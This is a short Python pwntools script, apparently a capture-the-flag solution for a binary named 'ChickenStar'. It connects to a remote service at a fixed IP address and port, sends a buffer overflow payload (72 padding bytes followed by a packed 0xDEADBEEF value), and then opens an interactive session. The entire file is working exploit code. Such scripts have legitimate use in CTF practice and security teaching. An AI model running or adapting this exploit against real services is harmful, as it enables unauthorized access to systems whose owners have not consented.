from pwn import *
#p=process('./ChickenStar')
p=remote('103.229.41.18',5555)
#raw_input("DEBUG")
payload = "a"*72
payload += p64(0xDEADBEEF)
p.sendline(payload)
p.interactive()